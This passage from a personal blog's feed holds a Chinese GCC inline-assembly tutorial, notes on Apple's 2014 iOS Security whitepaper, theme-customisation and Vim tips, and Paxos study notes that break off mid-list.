+<p>下面分别介绍指令列表、输出、输入和修改声明这四个部分。</p>
+
+<!-- more -->
+
+
+<h2>指令列表</h2>
+
+<p>基本上和 .S 文件的格式是一样的，不同的是要加个引号。需要注意的是每一行中只能有一个指令，如果一行中包含多条指令，则必须用 <code>;</code> 或换行符隔开。注意字符串中的换行符会被asm识别，但字符串以外、代码中的不会，参见一下示例</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// 换行符在字符串内，不需显示添加换行符</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %edx, %eax</span>
+</span><span class='line'>         <span class="n">mov</span> <span class="o">%</span><span class="n">ebx</span><span class="p">,</span> <span class="o">%</span><span class="n">edx</span><span class="s">&quot;)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// 换行符在字符串外，需显示添加换行符</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %edx, %eax</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>        <span class="s">&quot;mov %ebx, %edx&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// 没有换行符，使用 ; 分隔</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %edx, %eax; mov %ebx, %edx&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>关于指令中百分号的使用，当使用了冒号时，指令中<strong>必须</strong>使用 <code>%%</code> 来作为寄存器前缀；当没有使用冒号时，<strong>必须</strong>使用 <code>%</code> 作为寄存器前缀。</p>
+
+<h2>输出</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %%edx, %%eax&quot;</span> <span class="o">:</span> <span class="s">&quot;=a&quot;</span><span class="p">(</span><span class="n">var_a</span><span class="p">)</span> <span class="o">:</span> <span class="s">&quot;d&quot;</span><span class="p">(</span><span class="n">var_d</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>输出部分 <code>"=a"(var_a)</code> 的意思是把寄存器 <em>%eax</em> 中的值放入变量 <em>var_a</em> 中，由输出操作数（Operand） <code>var_a</code> 和 操作数约束（Constraint） <code>"=a"</code> 两部分组成。</p>
+
+<p>其中，操作数制定了输出向哪个 c 变量，该例中即 <em>var_a</em>；操作约束中的修饰符（Modifier） “=” 表明输出操作数在指令中是只写的，并且只作为输出。常用的修饰符还有“+”，表明操作数可读可写，既作输入又作输出，而约束中的“a”表征寄存器 <em>%eax</em>。</p>
+
+<p>详细的输出约束参见 GCC 文档 <a href="http://gcc.gnu.org/onlinedocs/gcc/Constraints.html#Constraints">6.42 Constraints for asm Operands</a></p>
+
+<p>如果有多个输出，需要用 “,” 将这些输出分隔开，如</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">asm</span> <span class="p">(</span><span class="s">&quot;cpuid&quot;</span>
+</span><span class='line'>  <span class="o">:</span><span class="s">&quot;=a&quot;</span> <span class="p">(</span><span class="n">_eax</span><span class="p">),</span>
+</span><span class='line'>   <span class="s">&quot;=b&quot;</span> <span class="p">(</span><span class="n">_ebx</span><span class="p">),</span>
+</span><span class='line'>   <span class="s">&quot;=c&quot;</span> <span class="p">(</span><span class="n">_ecx</span><span class="p">),</span>
+</span><span class='line'>   <span class="s">&quot;=d&quot;</span> <span class="p">(</span><span class="n">_edx</span><span class="p">)</span>
+</span><span class='line'>  <span class="o">:</span><span class="s">&quot;a&quot;</span> <span class="p">(</span><span class="n">op</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>输入</h2>
+
+<p>输入约束的基本意义与输出相同，不过不包含修饰符。</p>
+
+<p>输入的操作数部分可以是表达式。</p>
+
+<h2>修改声明</h2>
+
+<p>声明在这段汇编中哪些寄存器的值会改变，以及是否会修改内存。在一些情况下，这对与 gcc 编译、优化程序而言非常重要，比如我们在汇编中修改了一个既不是输入也不是输出的寄存器，如果不显示声明的话 gcc 会认为这段汇编之后该寄存器的值不变，导致程序出错。</p>
+
+<h2>参考</h2>
+
+<ul>
+<li><p><a href="http://www.ibm.com/developerworks/cn/linux/sdk/assemble/inline/index.html">Linux 中 x86 的内联汇编 &ndash; IBM</a></p></li>
+<li><p><a href="http://www.cnblogs.com/latifrons/archive/2009/09/17/1568198.html">C语言ASM汇编内嵌语法</a></p></li>
+<li><p><a href="http://andyhuzhill.github.io/ARM/GCC/ASM/2012/09/25/gcc-inline-assemly/">ARM体系下的GCC内联汇编</a></p></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Notes on iOS Security Whitepaper]]></title>
+    <link href="http://hanjc.me/blog/2014/03/03/ios-security/"/>
+    <updated>2014-03-03T19:56:09+08:00</updated>
+    <id>http://hanjc.me/blog/2014/03/03/ios-security</id>
+    <content type="html"><![CDATA[<p>This notes is based on <em>iOS Security &ndash; February 2014</em>, origin link can be found <a href="http://images.apple.com/iphone/business/docs/iOS_Security_Feb14.pdf">here</a>.</p>
+
+<p>This paper gives a brief description of iOS security, including hardware security features and how iOS leverages these features.</p>
+
+<h2>System Security</h2>
+
+<h3>Secure Boot Chain</h3>
+
+<p>ROM is sealed with public key of Apple Root CA, and will verify the Low-Level Bootloader (LLB) before load it.</p>
+
+<p>For devices with an A7 processor, the <em>Secure Enclave</em> coprocessor also utilizes a secure boot process that ensures its separate software is verified and signed by Apple.</p>
+
+<p>Verification failure will enter <strong>recovery mode</strong>, if Boot ROM is not even able to load or verify LLB, it enters <strong>DFU (Device Firmware Update) mode</strong>.</p>
+
+<h3>System Software Authorization</h3>
+
+<p>GOAL: prevent the devices from being downgraded.</p>
+
+<p>Need iTunes to upgrade, when upgrading, iTunes (or the device) would send</p>
+
+<ol>
+<li>a list cryptographic measurements of each installation bundle to be installed</li>
+<li>nonce</li>
+<li>device&rsquo;s unique ID (ECID)</li>
+</ol>
+
+
+<p>to Apple installation authorization server.</p>
+
+<p>If upgrade request is permitted, server would add ECID to the measurement and signs the result.</p>
+
+<p>Device would check each item loaded from disk at boot time.</p>
+
+<!-- more -->
+
+
+<h3>Secure Enclave</h3>
+
+<p>There are two kinds of processors, <em>application processor (A7)</em> and <em>Secure Enclave</em>.</p>
+
+<p><strong>What is Secure Enclave?</strong>
+A coprocessor fabricated in the Apple A7 chip, has its OWN <em>secure boot</em> and <em>personalized software update</em>, <em>encrypted memory</em> and <em>hardware random number generator</em>.</p>
+
+<p><strong>What does Secure Enclave do?</strong>
+It provides all cryptographic operations for Data Protection key management and maintains the integrity of Data Protection, it is also responsible for processing fingerprint data, determining if there is a match, and enabling access or purchase on behalf of the user.</p>
+
+<p><strong>How Secure Enclave communicate with app processor?</strong>
+Communication is isolated to an interrupt-driven mailbox and shared memory data buffers.</p>
+
+<p>Each Secure Enclave is provisioned during fabrication with its own <em>UID (Unique ID)</em>, not known to Apple, not accessible to other parts of the system. Note that this UID is NOT SAME with that fused into application processor.</p>
+
+<p>Create an ephemeral key tangled with UID to encrypt Secure Enclave&rsquo;s portion of the device&rsquo;s memory space.</p>
+
+<p>Data saved to file system by Secure Enclave is encrypted with a key tangled with UID and an anti-replay counter.</p>
+
+<p>Utilizes System Software Authorization to ensure the integrity of its software and prevent downgrade.</p>
+
+<h4>Some Questions</h4>
+
+<ol>
+<li><p>How secure boot of Secure Enclave is achieved?</p></li>
+<li><p>Where the ephemeral key is stored? How about the key and anti-replay counter used to encrypt data written to file system by Secure Enclave?</p></li>
+</ol>
+
+
+<h3>Touch ID</h3>
+
+<p>80*80 pixel, 500 ppi <a href="http://en.wikipedia.org/wiki/Raster_scan">raster scan</a>, temporarily stored in Secure Enclave, data out from Touch ID sensor is encrypted, A7 can only forward it to Secure Enclave but never read its content.</p>
+
+<p>User&rsquo;s fingerprint map never leaves ip5s.</p>
+
+<h4>Safe communicate with Secure Enclave</h4>
+
+<p>Touch ID can only talk to Secure Enclave through application processor.  Communication between the A7 and the
+Touch ID sensor takes place over a <a href="http://en.wikipedia.org/wiki/Serial_Peripheral_Interface_Bus">serial peripheral interface bus</a>.</p>
+
+<p>There is a <em>device&rsquo;s key</em> that is build into the Touch ID sensor and Secure Enclave (should differ from Enclave&rsquo;s UID and device UID in application processor). To communicate with Enclave, Touch ID first negotiates with Enclave for a session key, which process should be protected by the device&rsquo;s key. Touch ID then sends the encrypted scan result to Enclave.</p>
+
+<blockquote><p>The session key exchange uses AES key wrapping with both sides providing a random key that establishes the session key and uses AES-CCM transport encryption</p></blockquote>
+
+<h4>Process of unlocking an iPhone</h4>
+
+<p>On regular A7 processor, Data Protection <em>class keys</em> are discarded, and regenerated when user unlock the device with passcode.</p>
+
+<p>With Touch ID, the keys are wrapped with a key given to Touch ID subsystem, Touch ID will provide the key for unwrapping if it recognizes the user&rsquo;s fingerprint (details refer to section <em>File Data Protection</em>)</p>
+
+<h3>Simple Conclusion</h3>
+
+<p>The following features are most critical for iOS system security</p>
+
+<ul>
+<li>UID in Secure Enclave</li>
+<li>dedicated secure CPU</li>
+<li>unbreakable ROM</li>
+</ul>
+
+
+<h2>Encryption and Data Protection</h2>
+
+<p>Focus on the protection of data stored on the device.</p>
+
+<h3>Hardware Security Features</h3>
+
+<p>Apple&rsquo;s devices involves some hardware support for security, these includes:</p>
+
+<ul>
+<li><p><em>Dedicated hardware AES 256 crypto engine</em> built into DMA path between Flash and Main Memory</p></li>
+<li><p><em>Hardware SHA-1</em></p></li>
+<li><p><em>Fused UID</em>, in application processor, unique to each device, software and firmware cannot read UID, can only get the results of encryption or decryption operations</p></li>
+<li><p><em>Fused GID</em>, common to a class of devices, used as an additional level of protection when delivering system software during installation and restore</p></li>
+</ul>
+
+
+<blockquote><p>Integrating these keys into the silicon helps prevent them from being tampered with or bypassed, or accessed outside the AES engine.</p></blockquote>
+
+<ul>
+<li><p>A hardware <em>random number generator (RNG)</em> to create all cryptographic keys (except those used in Secure Enclave)</p></li>
+<li><p><em>Effaceable Storage</em> for securely erasing saved keys</p></li>
+</ul>
+
+
+<h3>File Data Protection</h3>
+
+<p>GOAL: Protect data stored in flash memory.</p>
+
+<blockquote><p>Data Protection allows the device to respond to common events such as incoming phone calls, but also enables a high level of encryption for sensitive data</p></blockquote>
+
+<p>Managing a <strong>hierarchy of keys</strong>; built on hardware encryption; encrypted every file stored into the flash.</p>
+
+<blockquote><p>Data Protection is controlled on a per-file basis by assigning each file to a class; accessibility is determined by whether the class keys have been unlocked</p></blockquote>
+
+<p>Create a new 260-bit key (per-file key) for EACH file on the data partition, <em>hardware AES engine</em> uses these keys to encrypt files when written to flash memory using AES CBC mode.</p>
+
+<p>Per-file key is wrapped (by Enclave) with one class key (performed using NIST AES key wrapping, per RFC 3394). The wrapped per-file key is stored in the file’s <em>metadata</em>.</p>
+
+<p>To open a file: <strong>1.</strong> decrypt metadata with <em>File System Key</em> <strong>2.</strong> unwrapped with class key <strong>3.</strong> supply the per-file key to hardware AES engine.</p>
+
+<p>Use a random <em>File System Key</em> to encrypt the metadata of all files in the file system. This file system key is created when iOS first installed or when the device is wiped by a user. The key is stored in Effaceable Storage to be quickly erased.</p>
+
+<p>Once the File System Key is wiped, there should be no way to get the content of all the files.</p>
+
+<p>The work of key management is done by Secure Enclave, as mentioned in section Secure Enclave.</p>
+
+<h3>Passcodes</h3>
+
+<p>Supports <em>four-digit</em> and <em>arbitrary-length alphanumeric</em> passcodes.</p>
+
+<blockquote><p>In addition to unlocking the device, a passcode provides the entropy for encryption keys, which are not stored on the device. This means an attacker in possession of a device can’t get access to data in certain protection classes without the passcode.</p></blockquote>
+
+<p>Passcode is tangled with UID.</p>
+
+<p>Takes longer and longer for brute-force hack.</p>
+
+<p><strong>Where is this Passcodes stored?</strong>
+Passcodes should be managed by Secure Enclave, and stored in file system after being encrypted by Secure Enclave.</p>
+
+<h3>Data Protection Classes</h3>
+
+<p>Basic classes:</p>
+
+<ul>
+<li>Complete Protection</li>
+<li>Protected Unless Open</li>
+<li>Protected Until First User Authentication</li>
+<li>No Protection</li>
+</ul>
+
+
+<p><em>NSFileProtectionComplete</em> : class key protected with a key derived from Passcode and device UID, auto discard the decrypted class key after the screen is lock. File becomes inaccessible until unlock (either by Passcode or Touch ID).</p>
+
+<p><em>NSFileProtectionCompleteUnlessOpen</em> : for files need to be written while locking. Besides per-file key, Data Protection: <strong>1.</strong> creates another <em>public/private key pair</em> for the file <strong>2.</strong> a shared secret is computed using file&rsquo;s private key and this class&rsquo;s public key <strong>3.</strong> wrap the per-file key with the hash of shared secret <strong>4.</strong> wrapped per-file key and file&rsquo;s public key are stored in the file&rsquo;s metadata <strong>5.</strong> wipe the file&rsquo;s private key from memory <strong>6.</strong> to open the file, the shared secret is re-generated using file&rsquo;s public key and this class&rsquo;s private key, to unwrap per-file key.</p>
+
+<p><em>NSFileProtectionCompleteUntilFirstUserAuthentication</em> : behaves in the same way as Complete Protection, only that decrypted class key is not wiped after lock. This is DEFAULT CLASS for all third-party app data.</p>
+
+<p><em>NSFileProtectionNone</em> : class key protected only with UID (no Passcode), kept in Effaceable Storage. All the keys needed to decrypt files of this class are stored on the device.</p>
+
+<p>So in a short <strong>conslusion</strong>, all the files in iOS devices are encrypted, as there always be a hardware AES between memory and flash, only that stronger protection involves encrypting class key with Passcode, and auto wiping the decrypted key after the device is locked.</p>
+
+<h3>Keychain Data Protection</h3>
+
+<p>GOAL: protect short but sensitive bits of data in apps, such as keys and login tokens.</p>
+
+<p>Implemented as SQLite database, and there is only one database in the system. The <em>securityd</em> deamon determines which keychain items each process or app can access.</p>
+
+<p>The deamon would check app&rsquo;s &ldquo;keychain-access-groups&rdquo; and the &ldquo;application-identifier&rdquo; entitlement. Apps from the same author (have the same access groups prefix allocated to them through the iOS Developer Program) can share Keychain items.</p>
+
+<p>Similar protect class as file Data Protection.</p>
+
+<blockquote><p>Each keychain class has a “This device only” counterpart, which is always protected with the UID when being copied from the device during a backup, rendering it useless if restored to a different device</p></blockquote>
+
+<h3>Keybags</h3>
+
+<p>Manage keys for file and Keychain Data Protection classes, four keybags: <em>System</em>, <em>Backup</em>, <em>Escrow</em>, and <em>iCloud</em>.</p>
+
+<p><strong>System keybag</strong> where wrapped class keys are stored, is No Protection class itself. Contents of system keybag are encrypted with a key held in Effaceable Storage. This key is wiped and regenerated each time user change Passcode. System keybag is the ONLY keybag stored on the device.</p>
+
+<p><strong>Backup keybag</strong> created when an encrypted backup is made by iTunes and stored
+on the computer where the device is backed up. The backed-up data is <strong>re-encrypted</strong> to a new set of keys (a new keybag).</p>
+
+<p><strong>Escrow keybag</strong> is used for iTunes syncing and mobile device management (MDM). Allows iTunes to sync without requiring the user to enter a passcode and allows an MDM server to remotely clear a user&rsquo;s passcode. Stored on computer. Contains exactly the SAME class keys used on device, protected by a newly created key, which is stored on the device in Protected Until First User Authentication class.</p>
+
+<p><strong>iCloud Backup keybag</strong> similar to Backup keybag, all class keys in this keybag are asymmetric.</p>
+
+<blockquote><p>For all Data Protection classes except No Protection, the encrypted data is read from the device and sent to iCloud. The corresponding class keys are protected by iCloud keys. The keychain class keys are wrapped with a UID-derived key in the same way as an unencrypted iTunes backup.</p></blockquote>
+
+<h2>App Security</h2>
+
+<p>iOS provides protection to ensure that apps are signed and verified, cannot execute malicious code, and are sandboxed to protect user data at all times.</p>
+
+<h3>App Code Signing</h3>
+
+<p>Mandatory code signing esing Apple-issued certificate. Developers must join iOS Developer Program and provide their real-world indentity for verification.</p>
+
+<h3>Runtime Process Security</h3>
+
+<p>Sandbox. Randomly assigned home directory, can only communicate with APIs.</p>
+
+<p>Majority of iOS and all third-party apps run as the non-privileged user &ldquo;mobile&rdquo;.</p>
+
+<p>Address space layout randomization (ASLR)</p>
+
+<p>ARM&rsquo;s Execute Never (XN) feature, which marks memory pages as non-executable.</p>
+
+<blockquote><p>Memory pages marked as both writable and executable can be used only by apps under tightly controlled conditions: The kernel checks for the presence of the Apple-only dynamic code-signing entitlement.</p></blockquote>
+
+<h3>Data Protection in Apps</h3>
+
+<p>Data Protection is available for file and database APIs, Protected Until First User Authentication by default.</p>
+
+<h3>Accessories</h3>
+
+<p>The following process is entirely handled by a integrated circuit that Apple provides to approved accessory manufacturers and is transparent to the accessory.</p>
+
+<ul>
+<li>Check accessory&rsquo;s Apple-provided certificate.</li>
+<li>Send a challenge, which the accessory must answer with a signed response.</li>
+</ul>
+
+
+<h2>Network Security </h2>
+
+<p>Uses standard networking protocols for authenticated, authorized, and encrypted communications. Integrates proven technologies and the latest standards for both Wi-Fi and cellular data network connections.</p>
+
+<p>(Refer to the paper for details)</p>
+
+<ul>
+<li>SSL (v3), TLS (v1.0, v1.1, v1.2)</li>
+<li>VPN, supports multiple protocols and authentication methods</li>
+<li>Wi-Fi, industry-standard Wi-Fi protocols</li>
+<li>Bluetooth, Encryption Mode &frac34;, Service Level 1 connections, multiple Blutooth profiles</li>
+<li>Single Sign-on (I do not know what this SSO is&hellip;)</li>
+</ul>
+
+
+<h3>AirDrop Security</h3>
+
+<p>Use Bluetooth Low-Energy (BTLE) and Apple-created peer-to-peer Wi-Fi technology.</p>
+
+<p>If enabled, a 2048-bit RSA identity is stored on the device, and an AirDrop identity hash is created based on email address and phone number.</p>
+
+<p>Use TLS connection.</p>
+
+<h2>Internet Security</h2>
+
+<p>Explain the security control of iMessage, FaceTime, Siri, iCloud, iCloudKeychain in detail.</p>
+
+<h3>iMessage</h3>
+
+<p>The contents of messages of iMessage are protected by end-to-end encryption, so no one but the sender and receiver can access them, even Apple cannot.</p>
+
+<p>Device generates two pairs of keys for iMessage: an RSA 1280-bit key for encryption and an ECDSA 256-bit key for signing. The private keys are stored in device&rsquo;s keychain while the public keys are sent to Apple&rsquo;s directory service (IDS), where they are associated with user&rsquo;s phone number or email address and Apple Push Notification Service (APNs) address.</p>
+
+<p>To send a message, iMessage first fetches receiver&rsquo;s public keys and APNs addresses from the IDS, then encrypts the content using receiver&rsquo;s public keys, and signs the encrypted messages with the sender&rsquo;s private key, finally, iMessage dispatches each encrypted message to APNs for delivary. Metadata is not encrypted while communication with APNs is encrypted using TLS.</p>
+
+<p>If the message contains attachments, the attachments are uploaded to iCloud after encryption, the keys to decrypt attackments along with URI to the encrypted attachments are included in the encrypted message.</p>
+
+<p>For the receiver, each device receives its copy of the message from APNs, and decrypts the message with its own private key. The message can be verified using sender&rsquo;s public key.</p>
+
+<h2>Device Control</h2>
+
+<p>Policies for Passcode Protection, Configuration Enforcement, Mobile Device Management, Apple Configurator, Device Restrictions, Supervised Only Restrictions and Remote Wipe.</p>
+
+<h2>Conclusion</h2>
+
+<ul>
+<li>Hardware support: UID, Secure Enclave, ROM, Hardware AES, Random Number Generator</li>
+<li>Dedicated Secure Processor, with encrypted memory</li>
+<li>Full Storage Encryption</li>
+<li>Hierarchy of Key Management</li>
+</ul>
+
+
+<p>From the document we can see, Apple really takes great efforts in security, and as Apple&rsquo;s hardware and software are tightly combined, they possess the most enviable hardware security features. But to achieve security, Apple sacrifices the ability of third party apps by setting a lot of constrains and providing only a limited APIs.</p>
+
+<p>Oh! One more thing, all of these protections are useless if your device is rooted.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Using theme Greyshade]]></title>
+    <link href="http://hanjc.me/blog/2014/02/27/using-theme-greyshade/"/>
+    <updated>2014-02-27T14:11:32+08:00</updated>
+    <id>http://hanjc.me/blog/2014/02/27/using-theme-greyshade</id>
+    <content type="html"><![CDATA[<p>Sometimes ago I came across a blog <a href="http://samwize.com/">samwize</a>, who uses a slightly
+modified theme called <a href="https://github.com/shashankmehta/greyshade">Greyshade</a>, which I
+think is very beautiful, so I applied that theme immediately. Saddly this theme does
+not support chinese very well, so I made some customization myself.</p>
+
+<!-- more -->
+
+
+<h3>Font and Size</h3>
+
+<ul>
+<li>add new font &ldquo;Microsoft Yahei&rdquo; for Chinese, add font &ldquo;Consolas&rdquo; for monospace</li>
+<li>enlarge the font size of an article</li>
+<li>enlarge the line height to make it comfortable to read Chinese
+</br> may be it is not large enough for Chinese, but I think it is too large for English</li>
+<li>enlarge the font size of meta info of an article</li>
+<li>decrease the font size for archieve view</li>
+</ul>
+
+
+<h3>Layout</h3>
+
+<ul>
+<li>abandon fixed width layout</li>
+<li>change the way meta info is displayed</li>
+<li>display meta info in the article view</li>
+<li>add Next and Prev link in the article view</li>
+<li>change a sharing provider</li>
+<li>remove the shadow below the sharing</li>
+</ul>
+
+
+<h3>Profile</h3>
+
+<ul>
+<li>use a local image instead of that of Gravatar.com, too slow</li>
+</ul>
+
+
+<p>I would soon post my modified theme on my Github,
+it is sad that I did not modify the style directly on the theme but in my <em>sass/</em> and <em>source/</em>,
+so I need to patch my modification and merge it into the Greyshade. I would do this later&hellip;</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Vim Efficiency Notes]]></title>
+    <link href="http://hanjc.me/blog/2014/02/24/vim-notes/"/>
+    <updated>2014-02-24T15:00:00+08:00</updated>
+    <id>http://hanjc.me/blog/2014/02/24/vim-notes</id>
+    <content type="html"><![CDATA[<p>关于Vim的一些容易被忽视、却又能提升使用体验和操作效率的操作细节。同时记录Vim中一些（我见到过的）比较实用的配置，分享的同时也给自己留个备忘吧。
+一下子总结不完整，慢慢更新。</p>
+
+<!-- more -->
+
+
+<h2>基本操作</h2>
+
+<p>基本按照幸福感排序，排在前边的是我觉得用了之后一口气儿上五楼都不累的，稍微靠后一点排的就比较随意了。每一项第一行的<em>斜体字</em>是我认为该组合比较有用的场景。</p>
+
+<p><strong>使用Ctrl+[ 替代Esc</strong>，<em>任何时候</em></br>
+Ctrl+[ 功能与Esc键完全相同，用这一快捷键的好处就不用解释了，大家都知道按Esc是件多么令人伤神的事情</p>
+
+<p><strong>X和x</strong>，<em>任何时候</em></br>
+X 是退格（Backspace），x 是删除（Delete）</p>
+
+<p><strong>使用Ctrl+e 和 Ctrl+y逐行翻滚页面</strong>，<em>阅读（代码）</em></br>
+这两个组合非常有用，作用分别是维持当前坐标位置不变，页面上滚和下滚一行</p>
+
+<p><strong> #和* </strong>，<em>阅读代码</em></br>
+#（shift+3）用来向上搜索当前光标所在单词，*（shift+8）用来向下搜索</p>
+
+<p><strong>%</strong>，<em>阅读代码</em></br>
+在相对应的两个括号之间跳转，当一段函数体非常长的时候能方便的从反括号跳至函数/循环/if等结构的开始处</p>
+
+<p><strong>+ 和 &ndash;</strong></br>
++ 的功能是跳转到下一行行首，与之相对应，- 是跳转到上一行行首</p>
+
+<p><strong>J</strong></br>
+删除行末换行符，在把多行连接成一行时非常有用</p>
+
+<p><strong>zz和zt</strong>，<em>阅读</em></br>
+将光标所在行置于屏幕中间/顶部，阅读代码时比较有用</p>
+
+<p><strong>H，M 和 L</strong>, <em>代码、文章编辑</em></br>
+H，M和L（注意是大写）用来将光标快速移动到当前屏幕的最顶行/中间行/最底行</p>
+
+<p><strong>使用m 和` （Esc下边那个按键）进行标记和跳转</strong></br>
+先按m，然后随意输入一个字母，就能用该字母标记当前行，之后在当前文件任意位置可以按 ` + 之前标记的字母快速跳转到这一行。在被标记的行按m，加同样的字母可以取消标记，如果连续按两次`，则光标会在当前位置，和上一次的跳转位置之间来回切换</br>
+此外，这里还可以使用<em>单引号</em>代替反引号，他们俩的功能是一样一样的</p>
+
+<p><strong>A 和 I</strong></br>
+A 是在本行行尾插入，I 是在本行行首插入。</p>
+
+<p><strong>Ctrl+a和Ctrl+x</strong>
+将当前光标所在位置处的数字加1/减1，比较好玩儿的命令，一般用不到，不过用到的话确实很方便</p>
+
+<h2>配置</h2>
+
+<h4>wildmode, wildmenu</h4>
+
+<p>输入命令<code>:set wildmode=list:longest,full</code>和<code>:set wildmenu</code>，在vim窗口下方会出现一条menu，当需要补全的时候（例如<code>:e</code>命令打开新文件，或者输入<code>:s</code>后希望模糊搜索所有s开头的vim命令），按Tab键时自动补全时行为会变为：</p>
+
+<ol>
+<li>出现一个list，为当前目录下所有文件，此时可进行并再次按Tab补全</li>
+<li>跳至列表第一个选项，或者（如果第1步中输入了文件开头字母）自动补全当前输入</li>
+</ol>
+
+
+<p>默认行为没有步骤1，直接跳转第一个选项，而且不会显示整体列表，使用起来体验极差。</p>
+
+<!-- 字符串匹配、替换 -->
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Notes on Paxos Made Simple]]></title>
+    <link href="http://hanjc.me/blog/2014/02/12/paxos/"/>
+    <updated>2014-02-12T16:21:02+08:00</updated>
+    <id>http://hanjc.me/blog/2014/02/12/paxos</id>
+    <content type="html"><![CDATA[<p><a href="http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf">Origin paper link</a></p>
+
+<h3>Problem</h3>
+
+<p>safety requirements</p>
+
+<ul>
+<li>Only a value that has been proposed may be chosen</li>
+<li>Only a single value is chosen, and</li>
+<li>A process never learns that a value has been chosen unless it
+acutally has been</li>
+</ul>
+
+
+<p>three agents: <em>proposers</em>(P), <em>acceptors</em>(A), and <em>learners</em>(L).</p>
+
+<!-- more -->
+
+
+<p>use customary asynchronous, non-Byzantine model, in which:</p>
+
+<ul>
+<li>Agents operate at arbitrary speed, may fail by stopping, and may
+restart</li>
+<li>Messages can take arbitrarily long to be delivered, can be duplicated,
+and can be lost, but they are not corrupted.</li>
+</ul>
+
+
+<h3>Choosing a Value</h3>
+
+<p>Single acceptor, simple but unsatisfacroty, suffer from failure
+of this single acceptor.</p>
+
+<p><strong>Majority of the agents?</strong>
+Literally understand as more than half of acceptors.</p>
+
+<p>To ensure that only a single value is chosen, we can let a large
+enough set consist of <strong>any majority of the agents</strong>. Because any two
+majorities have at least one acceptor in common, this works if an
+acceptor can accept at most one value.</p>
+
+<blockquote><p>P1. An acceptor must accept the first proposal that it receives.</p></blockquote>
+
+<p>This ensure that the value got chosen if there is only one value
+proposed. But raises the problem when more than two values are
+proposed and each got same amount of acceptors(3 values, each 1/3 of
+all acceptors).</p>
+
+<p><strong>Acceptor must be allowed to accept more than one proposals</strong>
+Though there can be only one value that got chosen, but each acceptor indeed could accept more than one proposals.</p>
+
+<p><strong>Proposal number is global? or for each acceptor? How to achieve global?</strong>
+It should be global.</p>
+
+<blockquote><p>P2. If a proposal with value <em>v</em> is chosen, then every higher-numbered
+proposal that is chosen has value <em>v</em>.</p></blockquote>
+
+<p>P2 guarantees the crucial safety property that only a single value is chosen.</p>
+
+<blockquote><p>P2a. If a proposal with value <em>v</em> is chosen, then every higher-numbered
+proposal accepted by any acceptor has value <em>v</em>.</p></blockquote>
+
+<p>P1 may conficts P2a in some situations.
+Suppose a proposal was chosen with some particular acceptor <em>c</em> never
+having received any proposal. A new proposer &ldquo;wakes up&rdquo; then and
+issues a higher-numbered proposal with a different value. P1 requires
+<em>c</em> to accept this proposal, violating P2a.</p>
+
+<p>Maintaining both P1 and P2a requires strengthening P2a to:</p>
+
+<blockquote><p>P2b . If a proposal with value <em>v</em> is chosen, then every higher-numbered
+proposal issued by any proposer has value <em>v</em>.</p></blockquote>
+
+<p><strong>Difference between concepts <em>chosen</em>, <em>accept</em> and <em>issue</em>?</strong> <em>Chosen</em> is a global state that a value <em>v</em> has been accepted by majority of acceptors, the whole system can only choose one value. <em>Accept</em> is the behavior of a single acceptor, the acceptor can change its mind to accept another newer proposal at any time. <em>Issue</em> is the behavior of a single proposer, if a value <em>v</em> is <em>chosen</em> (globally accepted), then all proposers would make compromise to propose <em>v</em>.</p>
+
+<p>Given that <strong>any two sets of majaority acceptors must have at least one acceptor in common</strong>. We want the following invariance meet:</p>
+
+<blockquote><p>P2c. For any <em>v</em> and <em>n</em>, if a proposal with value <em>v</em> and number <em>n</em> is
+issued, then there is a set <em>S</em> consisting of a majority of
+acceptors such that
+either (a) no acceptor in <em>S</em> has accepted any proposal numbered less
+than <em>n</em>, or (b) <em>v</em> is the value of the highest-numbered proposal
+among all proposals numbered less than <em>n</em> accepted by the acceptors
+in <em>S</em>.</p></blockquote>
+
+<p>To maintain the invariance of P2c, a proposer that wants to issue a
+proposal numbered <em>n</em> must learn the highest-numbered proposal with
+number less than <em>n</em> that has been or will be accepted by each
+acceptor in some majority of acceptors.</p>
+
+<p>It is hard to predict future acceptances, instead, the proposer controls
+it by extracting a <strong>promise</strong> that the acceptors won&rsquo;t accept any more
+proposals numbered less than <em>n</em>.</p>
+
+<p>Note that P2c guaranteed that <strong>if a value <em>v</em> is chosen, then the highest-numbered proposal must have value <em>v</em></strong>.</p>
+
+<p><strong>Algorithm for a proposer to issue proposals</strong>:</p>
+
+<ol>
+<li>A proposer choses <em>n</em>, sends a request to each acceptors in some
+set, asking:
+
+<ol>
+<li>Promise it won&rsquo;t accept a proposal numbered less than <em>n</em></li>
+<li>The proposal with highest number less than <em>n</em> that it has accepted.</li>
+</ol>
+</li>
